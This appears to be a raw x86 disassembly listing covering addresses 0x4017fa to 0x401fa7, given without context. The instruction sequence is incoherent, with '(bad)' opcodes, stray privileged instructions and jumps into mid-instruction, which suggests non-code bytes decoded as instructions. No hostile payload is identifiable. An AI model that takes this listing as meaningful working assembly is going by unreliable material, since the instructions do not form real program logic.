  4017fa:	add    BYTE PTR [eax],ah
  4017fc:	add    BYTE PTR [edx],cl
  4017fe:	adc    BYTE PTR [eax],0x7
  401801:	add    al,0x58
  401803:	xor    DWORD PTR [eax-0x38],esp
  401806:	sbb    al,0xe2
  401808:	adc    al,0x2
  40180a:	push   eax
  40180b:	xchg   BYTE PTR [eax-0x7fedd390],cl
  401811:	add    BYTE PTR [eax+ecx*1],0x50
  401815:	add    al,BYTE PTR [eax]
  401817:	xchg   BYTE PTR [edx],dl
  401819:	rcl    DWORD PTR [eax],cl
  40181b:	and    ecx,DWORD PTR [eax]
  40181d:	inc    ebp
  40181e:	or     BYTE PTR [eax+eax*1+0x30281042],cl
  401825:	or     eax,0x48014338
  40182a:	sbb    eax,0x81829040
  40182f:	sub    BYTE PTR [esi],0x14
  401832:	or     BYTE PTR ss:[eax+0x22c98804],al
  401839:	jb     0x40183c
  40183b:	sbb    BYTE PTR [eax+edx*4+0x2],dl
  40183f:	adc    DWORD PTR ds:0x4322831,0x2
  401846:	add    eax,0x25352400
  40184b:	xchg   BYTE PTR [ecx+0x48a2894],cl
  401851:	pop    ss
  401852:	and    DWORD PTR [edx+0x300],eax
  401858:	and    BYTE PTR [eax+0x12],al
  40185b:	inc    eax
  40185c:	adc    al,0x18
  40185e:	adc    DWORD PTR [eax-0x1ffefdf0],eax
  401864:	xor    eax,DWORD PTR [eax]
  401866:	sub    cl,BYTE PTR [ecx]
  401868:	add    BYTE PTR [esi+0x6],al
  40186b:	inc    ecx
  40186c:	push   ss
  40186d:	loopne 0x40187b
  40186f:	add    BYTE PTR [edx],0x8c
  401872:	xor    BYTE PTR ds:0x1828603,al
  401878:	add    al,BYTE PTR [eax+edi*2]
  40187b:	cmp    BYTE PTR [edx+0xb218a0],al
  401881:	or     cl,al
  401883:	or     al,0xf
  401885:	push   edx
  401886:	and    BYTE PTR [edx+eax*2],cl
  401889:	add    BYTE PTR [eax],0x8
  40188c:	xor    ah,BYTE PTR [eax+eax*1]
  40188f:	adc    BYTE PTR [eax],al
  401891:	pop    esp
  401892:	xchg   BYTE PTR [eax+0x60],al
  401895:	xor    al,0xe8
  401897:	add    BYTE PTR [eax],al
  401899:	or     eax,0x494c1040
  40189e:	or     BYTE PTR [edx+0x6],al
  4018a1:	add    eax,DWORD PTR [edx+0xf]
  4018a4:	add    ch,cl
  4018a6:	add    BYTE PTR ds:0x88616a0,cl
  4018ac:	add    DWORD PTR [ecx-0x7b13f57c],edi
  4018b2:	inc    eax
  4018b3:	add    ecx,DWORD PTR [eax]
  4018b5:	add    BYTE PTR [ebp-0x7fffaef8],al
  4018bb:	mov    BYTE PTR [eax+0x0],dh
  4018be:	inc    esp
  4018bf:	lea    ebp,[eax]
  4018c1:	mov    BYTE PTR [eax+ecx*2+0x8],ah
  4018c5:	or     al,0x0
  4018c7:	cmc    
  4018c8:	add    ah,BYTE PTR [edx+0x5]
  4018cb:	add    DWORD PTR [eax+0x8],0x9e840800
  4018d2:	add    al,0xb1
  4018d4:	and    eax,0x380d3111
  4018d9:	add    al,0xb1
  4018db:	or     BYTE PTR [eax],0x4
  4018de:	dec    edx
  4018df:	pusha  
  4018e0:	inc    ecx
  4018e1:	or     BYTE PTR [eax],al
  4018e3:	add    al,0x4
  4018e5:	sub    BYTE PTR [edx],al
  4018e7:	je     0x401877
  4018e9:	or     BYTE PTR [eax+0x542041b3],al
  4018ef:	dec    eax
  4018f0:	and    BYTE PTR [eax+edx*1],dh
  4018f3:	inc    edx
  4018f4:	scas   eax,DWORD PTR es:[edi]
  4018f5:	and    BYTE PTR [esi+0x50],dl
  4018f8:	and    eax,0x4002b2a
  4018fd:	sub    DWORD PTR [esi-0x3c],eax
  401900:	add    DWORD PTR [ecx+0x444c2131],eax
  401906:	add    BYTE PTR [eax],dl
  401908:	or     eax,0x4e6a4242
  40190d:	je     0x40190f
  40190f:	add    BYTE PTR [eax+eiz*1+0x3185800],ah
  401916:	mov    BYTE PTR [edx],dl
  401918:	or     eax,DWORD PTR [eax+0x21]
  40191b:	or     BYTE PTR [ebx],cl
  40191d:	sbb    BYTE PTR [eax],0x0
  401920:	inc    eax
  401921:	xor    eax,0xc0090081
  401926:	inc    eax
  401927:	inc    eax
  401928:	adc    eax,0x640f8d8
  40192d:	or     al,0x8
  40192f:	or     BYTE PTR [edx],al
  401931:	inc    eax
  401932:	loopne 0x401974
  401934:	add    BYTE PTR [ecx],al
  401936:	sub    BYTE PTR [eax+0x2],cl
  401939:	add    BYTE PTR [eax],0x22
  40193c:	sbb    BYTE PTR [edi],0x28
  40193f:	in     eax,0x3
  401941:	add    eax,0x500c14
  401946:	and    DWORD PTR [eax],edx
  401948:	add    BYTE PTR [ecx+edx*4],0x40
  40194c:	add    al,BYTE PTR [edx]
  40194e:	or     BYTE PTR [eax],al
  401950:	stos   BYTE PTR es:[edi],al
  401951:	add    esp,DWORD PTR [eax-0x4b39edd8]
  401957:	sbb    DWORD PTR [eax],eax
  401959:	add    BYTE PTR [eax+0x14020c10],al
  40195f:	xchg   edx,eax
  401960:	push   ebp
  401961:	mov    DWORD PTR [ecx],eax
  401963:	or     BYTE PTR [eax-0x2ffbff80],0x32
  40196a:	add    BYTE PTR [eax],ah
  40196c:	push   ss
  40196d:	push   ss
  40196e:	push   0x7
  401970:	dec    eax
  401971:	and    BYTE PTR [edx+0x8034333],cl
  401977:	or     BYTE PTR ds:[ecx*1-0x3bf9ede0],al
  40197f:	add    eax,DWORD PTR [esi+esi*1+0x64fa6000]
  401986:	cwde   
  401987:	dec    edx
  401988:	nop
  401989:	add    al,BYTE PTR ds:0x6a203443
  40198f:	add    BYTE PTR [eax+0x10012406],cl
  401995:	inc    eax
  401996:	enter  0x4,0x0
  40199a:	rcl    DWORD PTR [ebp+0x502825a3],0x1a
  4019a1:	and    ah,BYTE PTR [ebp+0x0]
  4019a4:	xchg   edx,eax
  4019a5:	test   al,bl
  4019a7:	add    BYTE PTR [eax+0x30c1440],al
  4019ad:	and    DWORD PTR ds:0x2020382,eax
  4019b3:	test   BYTE PTR [edx],al
  4019b5:	add    eax,0x10866090
  4019ba:	add    BYTE PTR ds:[eax+0x1200082],al
  4019c1:	or     BYTE PTR [eax],ch
  4019c3:	or     DWORD PTR [eax],eax
  4019c5:	bound  eax,QWORD PTR [eax-0x64]
  4019c8:	and    BYTE PTR [eax+0x22102442],al
  4019ce:	mov    al,ds:0x200200
  4019d3:	and    bl,al
  4019d5:	add    BYTE PTR [ecx],0x18
  4019d8:	and    ebx,DWORD PTR [ecx+0x8]
  4019db:	add    BYTE PTR [esi],bh
  4019dd:	add    BYTE PTR [eax+0x12],0x50
  4019e1:	inc    eax
  4019e2:	and    BYTE PTR [eax],al
  4019e4:	dec    edx
  4019e5:	add    al,0xa1
  4019e7:	add    BYTE PTR [ebx+ebp*2-0x80],cl
  4019eb:	add    DWORD PTR [ecx+0x48168020],ecx
  4019f1:	cmp    BYTE PTR [eax],dh
  4019f3:	inc    esp
  4019f4:	rol    al,1
  4019f6:	xchg   ecx,eax
  4019f7:	mov    al,BYTE PTR [ecx+0x266b2]
  4019fd:	push   cs
  4019fe:	das    
  4019ff:	pop    eax
  401a00:	inc    edx
  401a01:	push   es
  401a02:	add    BYTE PTR [ecx],al
  401a04:	enter  0x6c1c,0x0
  401a08:	add    BYTE PTR [eax],ah
  401a0a:	add    BYTE PTR [eax],0xc4
  401a0d:	and    BYTE PTR [edx],al
  401a0f:	sub    eax,0x44401011
  401a14:	and    ch,BYTE PTR [edx]
  401a16:	add    al,0x8
  401a18:	or     al,0xd
  401a1a:	mov    WORD PTR [esi+0x40810028],?
  401a20:	adc    dh,BYTE PTR [edx+0x4005808]
  401a26:	add    eax,0x22942206
  401a2b:	add    BYTE PTR [edx],dh
  401a2d:	inc    ebx
  401a2e:	push   esi
  401a2f:	push   es
  401a30:	imul   ebx,DWORD PTR [edx],0x8
  401a33:	add    DWORD PTR [edx],0x888409b8
  401a39:	xchg   ecx,eax
  401a3a:	mov    eax,0x100040
  401a3f:	add    DWORD PTR [ebp-0x777afaff],0xc4015600
  401a49:	inc    edx
  401a4a:	(bad)  
  401a4b:	lds    eax,FWORD PTR [eax]
  401a4d:	fsubr  QWORD PTR [edx-0x5fb7b79c]
  401a53:	push   es
  401a54:	test   eax,0x88590810
  401a59:	and    DWORD PTR [eax+0x22c40383],0x681000a0
  401a63:	arpl   WORD PTR [edx],sp
  401a65:	dec    edx
  401a66:	and    al,0x20
  401a68:	dec    eax
  401a69:	add    DWORD PTR [eax],edx
  401a6b:	(bad)  [eax]
  401a6d:	nop
  401a6e:	or     eax,0x20af8362
  401a73:	add    DWORD PTR [esi-0x40],0x5089c040
  401a7a:	shl    BYTE PTR [esi],1
  401a7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401a7d:	add    eax,0x5011080
  401a82:	jno    0x401a0c
  401a84:	add    al,BYTE PTR [eax+0x103000]
  401a8a:	cwde   
  401a8b:	xor    BYTE PTR [esi],bl
  401a8d:	and    BYTE PTR [eax+0x1],bh
  401a90:	adc    al,BYTE PTR [edx+ebp*1]
  401a93:	push   edx
  401a94:	or     al,0xc
  401a96:	or     al,BYTE PTR [eax-0x3d]
  401a99:	mov    al,ds:0x11b0309
  401a9e:	inc    eax
  401a9f:	add    DWORD PTR [esi],esp
  401aa1:	add    DWORD PTR [eax+0x20],eax
  401aa4:	add    esp,DWORD PTR [edx-0x68dffd7e]
  401aaa:	int    0x60
  401aac:	cdq    
  401aad:	and    BYTE PTR [eax],cl
  401aaf:	sub    eax,DWORD PTR [eax]
  401ab1:	add    BYTE PTR [edx+0x284125d],ah
  401ab7:	mov    BYTE PTR [eax+eiz*1],al
  401aba:	add    edx,DWORD PTR [edi]
  401abc:	nop
  401abd:	and    al,0x0
  401abf:	add    al,BYTE PTR [ecx*4+0x15142001]
  401ac6:	push   eax
  401ac7:	or     BYTE PTR [ecx-0x7f],cl
  401aca:	loopne 0x401af0
  401acc:	and    BYTE PTR [eax],cl
  401ace:	ret    0x6083
  401ad1:	cld    
  401ad2:	pusha  
  401ad3:	add    BYTE PTR [eax+ecx*1],bl
  401ad6:	adc    BYTE PTR [ebp+0x1a],ch
  401ad9:	inc    ecx
  401ada:	and    DWORD PTR [eax+0x4802062e],eax
  401ae0:	inc    eax
  401ae1:	pushf  
  401ae2:	add    DWORD PTR [ecx+0x40d5c],eax
  401ae8:	add    BYTE PTR [eax],dh
  401aea:	rol    BYTE PTR [eax+0x8],0x6
  401aee:	and    al,0x48
  401af0:	or     al,0x2
  401af2:	ror    DWORD PTR [eax+0x14],1
  401af5:	sub    al,BYTE PTR [edx]
  401af7:	add    al,0xb
  401af9:	adc    ecx,DWORD PTR [ecx]
  401afb:	inc    edx
  401afc:	inc    eax
  401afd:	popa   
  401afe:	xchg   ecx,eax
  401aff:	add    eax,0xd1040246
  401b04:	add    BYTE PTR [ecx],al
  401b06:	add    DWORD PTR [eax+ebx*1],eax
  401b09:	add    ecx,ecx
  401b0b:	adc    bl,BYTE PTR [eax]
  401b0d:	enter  0x104,0x4
  401b11:	and    al,0x20
  401b13:	inc    eax
  401b14:	sbb    BYTE PTR [eax],0x34
  401b17:	xor    BYTE PTR [edx],al
  401b19:	push   eax
  401b1a:	inc    ebx
  401b1b:	and    BYTE PTR ss:[ebp+0x0],al
  401b1f:	add    dl,BYTE PTR [eax]
  401b21:	push   esp
  401b22:	sub    DWORD PTR [ecx+0x0],ecx
  401b25:	add    al,BYTE PTR [edx+ebx*1]
  401b28:	adc    BYTE PTR [edx],al
  401b2a:	inc    eax
  401b2b:	add    BYTE PTR [edx+0x8810400],0x54
  401b32:	push   edx
  401b33:	or     BYTE PTR [eax],ah
  401b35:	push   cs
  401b36:	add    BYTE PTR [ecx],ah
  401b38:	cmp    eax,DWORD PTR [eax+0x36787e01]
  401b3e:	adc    DWORD PTR fs:[ecx+eax*2+0x4c],edi
  401b43:	xor    eax,DWORD PTR [eax]
  401b45:	add    BYTE PTR [eax],al
  401b47:	inc    eax
  401b48:	mov    ds:0xc1180b28,al
  401b4d:	dec    ebp
  401b4e:	inc    ebp
  401b4f:	inc    eax
  401b50:	add    BYTE PTR [eax],cl
  401b52:	add    DWORD PTR [eax],0x970edd94
  401b58:	adc    cl,BYTE PTR [ebx+0x826805]
  401b5e:	adc    dl,BYTE PTR [ecx+0x4]
  401b61:	cmp    BYTE PTR [eax+0xd0f741],dl
  401b67:	xor    dl,BYTE PTR [edx+ecx*1]
  401b6a:	or     al,0x14
  401b6c:	(bad)  
  401b6d:	add    al,0x95
  401b6f:	sbb    DWORD PTR [eax+0x10],esp
  401b72:	adc    DWORD PTR [edx],ebx
  401b74:	add    edx,DWORD PTR [eax]
  401b76:	add    BYTE PTR [edx],0xc3
  401b79:	sbb    eax,0x14c08c80
  401b7e:	add    al,al
  401b80:	and    DWORD PTR [edx+0x420a3023],edx
  401b86:	and    eax,DWORD PTR [ebp-0x50]
  401b89:	dec    esp
  401b8a:	test   BYTE PTR [edx],al
  401b8c:	add    dl,dl
  401b8e:	sbb    eax,0x260024
  401b93:	test   BYTE PTR [ecx],ah
  401b95:	and    bl,BYTE PTR [edx+ebp*1+0x21332103]
  401b9c:	add    BYTE PTR [edx],al
  401b9e:	pop    edx
  401b9f:	or     eax,0x40000800
  401ba4:	add    DWORD PTR [edx],edx
  401ba6:	dec    eax
  401ba7:	inc    ecx
  401ba8:	adc    DWORD PTR [esp+ecx*4],ebx
  401bab:	or     BYTE PTR [ecx],dl
  401bad:	and    cl,BYTE PTR [eax]
  401baf:	dec    esi
  401bb0:	adc    eax,DWORD PTR [eax]
  401bb2:	or     BYTE PTR [eax],al
  401bb4:	sub    al,0x92
  401bb6:	adc    al,0x18
  401bb8:	mov    al,0xa4
  401bba:	adc    BYTE PTR [eax],al
  401bbc:	enter  0x242,0x84
  401bc0:	add    dl,BYTE PTR [eax]
  401bc2:	xor    BYTE PTR [eax-0x80],ah
  401bc5:	xor    BYTE PTR [edx],al
  401bc7:	test   BYTE PTR [esi],bl
  401bc9:	adc    BYTE PTR [edx],al
  401bcb:	pop    esp
  401bcc:	xor    DWORD PTR [eax+0x2020949],esp
  401bd2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401bd3:	or     eax,0x30ae0c40
  401bd8:	and    al,0x1
  401bda:	adc    DWORD PTR [edi],0x49141
  401be0:	test   BYTE PTR [edx],dl
  401be2:	push   esp
  401be3:	xor    al,BYTE PTR [edx+ebx*1]
  401be6:	add    BYTE PTR [ecx+0xb],al
  401be9:	push   esi
  401bea:	xor    BYTE PTR [ecx+eax*2],al
  401bed:	push   ecx
  401bee:	cli    
  401bef:	inc    eax
  401bf0:	cmp    BYTE PTR [ecx],0x14
  401bf3:	and    BYTE PTR [eax+0x16448082],ah
  401bf9:	sub    al,0x1
  401bfb:	sub    DWORD PTR [eax],eax
  401bfd:	dec    eax
  401bfe:	or     BYTE PTR [eax],al
  401c00:	sbb    BYTE PTR [eax+eax*1],0xc
  401c04:	add    BYTE PTR [eax],ah
  401c06:	sbb    DWORD PTR [ecx-0x7e],eax
  401c09:	fmul   DWORD PTR [edx]
  401c0b:	sub    ah,cl
  401c0d:	or     BYTE PTR [eax],dh
  401c0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401c10:	add    ah,BYTE PTR [ecx+eax*1]
  401c13:	and    BYTE PTR [ecx],dl
  401c15:	icebp  
  401c16:	xchg   ecx,eax
  401c17:	adc    BYTE PTR [eax-0x3b],al
  401c1a:	mov    al,0xe4
  401c1c:	les    edi,FWORD PTR [eax]
  401c1e:	inc    esp
  401c1f:	mov    ds:0x30280488,al
  401c24:	add    DWORD PTR [edx],ecx
  401c26:	add    DWORD PTR [ecx+0x1],0x18c25409
  401c2d:	and    al,BYTE PTR [ecx]
  401c2f:	xchg   DWORD PTR [eax+eiz*8+0x90104a],ecx
  401c36:	sub    al,0x90
  401c38:	and    BYTE PTR [eax+0x48210008],0x6
  401c3f:	adc    BYTE PTR [eax+ecx*1+0x50002c01],al
  401c46:	adc    al,0x0
  401c48:	adc    DWORD PTR [eax],edx
  401c4a:	or     eax,0x104e8821
  401c4f:	add    DWORD PTR cs:[ebx+eiz*8],eax
  401c53:	sbb    BYTE PTR [eax],cl
  401c55:	inc    eax
  401c56:	or     BYTE PTR [eax],dl
  401c58:	add    BYTE PTR [eax+0x1142],al
  401c5e:	sub    BYTE PTR ds:0x15250150,0x2
  401c65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401c66:	dec    esi
  401c67:	xor    BYTE PTR [ecx],al
  401c69:	adc    ah,BYTE PTR [edx+0xd01186]
  401c6f:	adc    DWORD PTR [ebx+0x8],eax
  401c72:	or     bl,BYTE PTR [esi-0x7c]
  401c75:	add    BYTE PTR [edx-0x745e87e0],al
  401c7b:	or     BYTE PTR [eax+0x10900308],dl
  401c81:	add    DWORD PTR [edx],edx
  401c83:	add    BYTE PTR [eax+0x0],dl
  401c86:	add    BYTE PTR [eax],al
  401c88:	dec    eax
  401c89:	and    al,0xc4
  401c8b:	push   eax
  401c8c:	push   ebp
  401c8d:	add    dl,BYTE PTR [ebx]
  401c8f:	bound  eax,QWORD PTR [ecx+0x1]
  401c92:	ret    0x414
  401c95:	mov    DWORD PTR [edx+eiz*1],eax
  401c98:	push   edx
  401c99:	add    dh,ah
  401c9b:	pop    edx
  401c9c:	add    DWORD PTR [ecx],esp
  401c9e:	sub    eax,DWORD PTR [eax]
  401ca0:	sbb    BYTE PTR [eax],dh
  401ca2:	int3   
  401ca3:	mov    al,ds:0x900d0948
  401ca8:	add    ah,cl
  401caa:	or     ch,al
  401cac:	or     BYTE PTR [eax+0x10809900],bl
  401cb2:	adc    al,0x10
  401cb4:	adc    eax,0xc002c60
  401cb9:	or     al,BYTE PTR [edx]
  401cbb:	sub    BYTE PTR [ebx+0x11],ah
  401cbe:	add    BYTE PTR [ecx+0x51],cl
  401cc1:	add    al,0x80
  401cc3:	adc    al,0x21
  401cc5:	push   ebx
  401cc6:	(bad)  
  401cc7:	adc    BYTE PTR [eax+edx*2],ah
  401cca:	or     dl,BYTE PTR [edx]
  401ccc:	and    DWORD PTR [eax],eax
  401cce:	ss xchg edx,eax
  401cd0:	adc    eax,0xa6981304
  401cd5:	and    BYTE PTR [edx-0x68],al
  401cd8:	or     BYTE PTR [ecx],al
  401cda:	push   ss
  401cdb:	shl    DWORD PTR [eax],1
  401cdd:	add    DWORD PTR [ebx],0x44405401
  401ce3:	retf   
  401ce4:	dec    esi
  401ce5:	cmp    al,BYTE PTR [esi]
  401ce7:	les    esp,FWORD PTR [ebp+eax*4+0x2a]
  401ceb:	adc    BYTE PTR [edi+eax*4+0x10],ah
  401cef:	push   eax
  401cf0:	inc    eax
  401cf1:	test   eax,0x41944a09
  401cf6:	add    BYTE PTR [ecx],dl
  401cf8:	add    DWORD PTR [ebx],eax
  401cfa:	inc    eax
  401cfb:	and    al,BYTE PTR [eax]
  401cfd:	dec    eax
  401cfe:	adc    al,0xc4
  401d00:	test   dl,al
  401d02:	add    eax,0x6a201050
  401d07:	add    DWORD PTR [eax],eax
  401d09:	and    dl,dh
  401d0b:	aaa    
  401d0c:	add    BYTE PTR [edx+edx*1],dl
  401d0f:	push   ecx
  401d10:	rol    DWORD PTR [edx+0x9a54004],1
  401d16:	popf   
  401d17:	rcr    DWORD PTR [eax],cl
  401d19:	inc    ecx
  401d1a:	jae    0x401d51
  401d1c:	or     BYTE PTR [eax+0x41],ah
  401d1f:	add    BYTE PTR [eax+eax*1],cl
  401d22:	mov    al,ds:0x242230a8
  401d27:	inc    eax
  401d28:	pop    eax
  401d29:	mov    al,BYTE PTR [esp+eiz*8+0x2]
  401d2d:	add    BYTE PTR [esi],al
  401d2f:	mov    BYTE PTR [eax+0x26],0x58
  401d33:	xor    BYTE PTR [eax],cl
  401d35:	or     BYTE PTR [eax],bl
  401d37:	and    BYTE PTR ds:0x4c002002,0x8
  401d3e:	sbb    ah,BYTE PTR [eax+eiz*1+0x600180a4]
  401d45:	pushf  
  401d46:	and    BYTE PTR [eax],ah
  401d48:	mov    BYTE PTR [edx],dl
  401d4a:	xchg   ecx,eax
  401d4b:	mov    cl,0x49
  401d4d:	and    BYTE PTR [edx+eax*1+0x2114053e],dl
  401d54:	test   DWORD PTR [eax-0x3fdbfe00],edx
  401d5a:	add    BYTE PTR [edx],dl
  401d5c:	and    BYTE PTR ds:0x2c2121c0,dl
  401d62:	and    BYTE PTR [ecx+0x42],ch
  401d65:	add    al,0xd1
  401d67:	sbb    BYTE PTR [eax],al
  401d69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401d6a:	or     BYTE PTR [eax],dh
  401d6c:	and    BYTE PTR [ecx+0x10d90402],al
  401d72:	test   BYTE PTR [eax],al
  401d74:	lods   eax,DWORD PTR ds:[esi]
  401d75:	rol    DWORD PTR es:[ecx],0x22
  401d79:	xchg   BYTE PTR [esp+edx*1],al
  401d7c:	sbb    esp,DWORD PTR [edx+edx*4+0x2200a928]
  401d83:	push   eax
  401d84:	mov    eax,DWORD PTR [eax]
  401d86:	add    DWORD PTR [ecx],edx
  401d88:	lea    eax,[eax+ecx*1]
  401d8b:	and    BYTE PTR [eax+eax*1+0x17002915],al
  401d92:	cmp    al,0xd
  401d94:	or     DWORD PTR [eax],edx
  401d96:	mov    BYTE PTR [esp+eax*1],bl
  401d99:	mov    BYTE PTR [edx],dh
  401d9b:	rol    DWORD PTR [ecx+0x18],0x81
  401d9f:	add    dh,BYTE PTR [edx]
  401da1:	enter  0x4125,0x20
  401da5:	add    BYTE PTR [ecx],al
  401da7:	add    BYTE PTR [eax+0x2682240],ah
  401dad:	push   0x1881102b
  401db2:	add    BYTE PTR [edi-0x7c],dl
  401db5:	mov    al,ds:0x30900522
  401dba:	or     BYTE PTR [edx],al
  401dbc:	inc    edx
  401dbd:	add    al,al
  401dbf:	test   BYTE PTR [edx],al
  401dc1:	add    ah,BYTE PTR [eax]
  401dc3:	add    BYTE PTR [eax],ah
  401dc5:	sub    BYTE PTR [ecx],ah
  401dc7:	or     BYTE PTR [eax],al
  401dc9:	sub    BYTE PTR [esi-0x56efcef0],ch
  401dcf:	test   BYTE PTR [eax+eax*1+0x28097800],cl
  401dd6:	cmp    al,al
  401dd8:	test   al,0x10
  401dda:	add    DWORD PTR [ecx],eax
  401ddc:	lds    ebx,FWORD PTR [esp+eax*1+0x0]
  401de0:	add    edx,DWORD PTR [edx+eax*2]
  401de3:	sub    al,BYTE PTR [eax+0x1340036]
  401de9:	dec    eax
  401dea:	dec    esp
  401deb:	inc    eax
  401dec:	push   ss
  401ded:	add    BYTE PTR [eax+eax*4],ch
  401df0:	and    BYTE PTR [eax+0x8],0x12
  401df4:	add    DWORD PTR es:[eax+eax*1],0xffffffb0
  401df9:	and    eax,0x8108884
  401dfe:	push   ebp
  401dff:	pop    esi
  401e00:	adc    BYTE PTR [edx+0x40e10048],dl
  401e06:	sbb    BYTE PTR [eax],bl
  401e08:	sbb    al,BYTE PTR es:[eax+eax*4]
  401e0c:	or     BYTE PTR ds:0x12e99aa4,al
  401e12:	dec    eax
  401e13:	adc    DWORD PTR [ebx],eax
  401e15:	xchg   esp,eax
  401e16:	mov    eax,0xa3a874
  401e1b:	sub    al,0x46
  401e1d:	lods   al,BYTE PTR ds:[esi]
  401e1e:	nop
  401e1f:	sbb    BYTE PTR [eax],0x2
  401e22:	test   BYTE PTR [ecx+eax*4],ah
  401e25:	xchg   esi,eax
  401e26:	xchg   BYTE PTR [eax+esi*4+0x4],al
  401e2a:	add    al,BYTE PTR [ebx]
  401e2c:	add    BYTE PTR [eax],0x0
  401e2f:	nop
  401e30:	xor    BYTE PTR [edx+eiz*8-0x78],al
  401e34:	push   edi
  401e35:	add    BYTE PTR [eax],al
  401e37:	adc    eax,0x8488100
  401e3c:	xchg   esi,eax
  401e3d:	and    ah,BYTE PTR [esi]
  401e3f:	dec    ecx
  401e40:	add    eax,0x10d0404
  401e45:	jno    0x401e48
  401e47:	sbb    BYTE PTR [esi+0x5843016],bl
  401e4d:	or     al,0x89
  401e4f:	inc    edx
  401e50:	add    BYTE PTR [ecx],ah
  401e52:	outs   dx,BYTE PTR ds:[esi]
  401e53:	and    BYTE PTR [eax],ah
  401e55:	add    BYTE PTR [esp+edx*2],0x80
  401e59:	inc    ecx
  401e5a:	adc    cl,dl
  401e5c:	adc    BYTE PTR [eax-0x7bcef99f],dh
  401e62:	adc    BYTE PTR [eax+eax*1],al
  401e65:	lods   al,BYTE PTR ds:[esi]
  401e66:	adc    ch,BYTE PTR [edi+edx*8]
  401e69:	add    al,0xae
  401e6b:	and    DWORD PTR [eax],eax
  401e6d:	cwde   
  401e6e:	pusha  
  401e6f:	adc    BYTE PTR [esi+0x29ac5383],al
  401e75:	and    BYTE PTR [esi-0x7bdbc788],al
  401e7b:	inc    edx
  401e7c:	add    BYTE PTR [ecx-0x2e],al
  401e7f:	add    BYTE PTR [eax+0x10010034],ch
  401e85:	inc    eax
  401e86:	nop
  401e87:	cmp    dl,BYTE PTR [ebx]
  401e89:	add    DWORD PTR [esi+0x202d4307],esp
  401e8f:	adc    al,0x2
  401e91:	mov    al,al
  401e93:	adc    al,0x83
  401e95:	add    BYTE PTR [edi],dl
  401e97:	add    al,0x80
  401e99:	add    BYTE PTR [eax],ah
  401e9b:	add    bh,BYTE PTR [eax+edx*1]
  401e9e:	add    BYTE PTR [eax],0x11
  401ea1:	dec    eax
  401ea2:	inc    eax
  401ea3:	and    cl,bl
  401ea5:	push   cs
  401ea6:	popa   
  401ea7:	jo     0x401eac
  401ea9:	mov    BYTE PTR [eax+0x0],cl
  401eac:	adc    BYTE PTR [edx],0xa
  401eaf:	test   eax,0xb5208
  401eb4:	add    eax,0x44240435
  401eb9:	jo     0x401ec0
  401ebb:	add    DWORD PTR [edx],edx
  401ebd:	xchg   ecx,eax
  401ebe:	nop
  401ebf:	les    esi,FWORD PTR [ebx+0x4c]
  401ec2:	cwde   
  401ec3:	and    BYTE PTR [eax],cl
  401ec5:	and    BYTE PTR [edx],al
  401ec7:	add    DWORD PTR [edx+0x1d80c48],esp
  401ecd:	and    esp,DWORD PTR fs:[edx+0x228448c]
  401ed4:	jg     0x401e6f
  401ed6:	adc    eax,0x200dd49
  401edb:	enter  0x1044,0x50
  401edf:	dec    ebx
  401ee0:	sbb    DWORD PTR [eax],eax
  401ee2:	xchg   esp,eax
  401ee3:	mov    cl,BYTE PTR [eax+eax*1]
  401ee6:	add    edx,DWORD PTR [eax+edx*1]
  401ee9:	adc    BYTE PTR [ecx],ah
  401eeb:	or     eax,DWORD PTR [eax+0x11c12]
  401ef1:	inc    eax
  401ef2:	rol    BYTE PTR [esi],0x9d
  401ef5:	and    BYTE PTR [ebx-0x7be55f5f],cl
  401efb:	mov    eax,DWORD PTR [eax+0x4]
  401efe:	mov    eax,ds:0xc1905f19
  401f03:	add    bl,BYTE PTR [ecx-0x80]
  401f06:	adc    al,BYTE PTR [eax]
  401f08:	es add al,0x32
  401f0b:	add    BYTE PTR [ecx],al
  401f0d:	inc    esp
  401f0e:	and    BYTE PTR [ebx+0x3e],dl
  401f11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401f12:	add    BYTE PTR [eax],cl
  401f14:	or     BYTE PTR [eax],al
  401f16:	inc    eax
  401f17:	mov    WORD PTR [edx+0x2],ss
  401f1a:	or     BYTE PTR [edx+0x25],dl
  401f1d:	pop    ss
  401f1e:	or     DWORD PTR [eax+0x38],eax
  401f21:	add    BYTE PTR [ecx-0x7c],cl
  401f24:	and    BYTE PTR [edx],al
  401f26:	xor    al,0xc1
  401f28:	sub    BYTE PTR [edx+0x40],0x8
  401f2c:	pusha  
  401f2d:	add    BYTE PTR [eax],0x20
  401f30:	and    al,0x91
  401f32:	sub    BYTE PTR [eax+0xc],dl
  401f35:	cmp    dl,BYTE PTR [ecx]
  401f37:	adc    BYTE PTR [eax],dl
  401f39:	popa   
  401f3a:	sub    eax,DWORD PTR [eax+0x4438221]
  401f40:	in     al,dx
  401f41:	add    DWORD PTR [eax],edx
  401f43:	and    BYTE PTR [eax],dl
  401f45:	adc    BYTE PTR [eax+0x6c],dh
  401f48:	add    BYTE PTR [ecx+eiz*1+0x13042470],dl
  401f4f:	inc    eax
  401f50:	das    
  401f51:	nop
  401f52:	sub    BYTE PTR [ecx+0x70],ah
  401f55:	adc    DWORD PTR [ecx],esp
  401f57:	adc    BYTE PTR [eax+0x24d18281],al
  401f5d:	inc    eax
  401f5e:	inc    eax
  401f5f:	add    BYTE PTR [edx+0x30a0a865],al
  401f65:	mov    BYTE PTR [eax],cl
  401f67:	add    BYTE PTR [edx],0x9f
  401f6a:	add    BYTE PTR [ecx],dl
  401f6c:	popa   
  401f6d:	jo     0x401fb8
  401f6f:	add    al,0xd8
  401f71:	or     eax,0x8826c062
  401f76:	add    BYTE PTR [edx],0x24
  401f79:	add    BYTE PTR [eax],al
  401f7b:	and    BYTE PTR [ecx],al
  401f7d:	add    eax,0x55800002
  401f82:	pop    eax
  401f83:	add    eax,0x44c2046c
  401f88:	and    BYTE PTR [ecx+ecx*2+0x8c540c3],ah
  401f8f:	sbb    BYTE PTR [edx],cl
  401f91:	and    DWORD PTR [edx],edx
  401f93:	push   eax
  401f94:	add    al,cl
  401f96:	pusha  
  401f97:	inc    ecx
  401f98:	add    cl,BYTE PTR [edx]
  401f9a:	add    BYTE PTR [esi],dh
  401f9c:	enter  0x1201,0x29
  401fa0:	add    cl,BYTE PTR [edx]
  401fa2:	sub    al,0x54
  401fa4:	mov    BYTE PTR [edi+edi*8],ah
  401fa7:	adc    eax,0x43509c
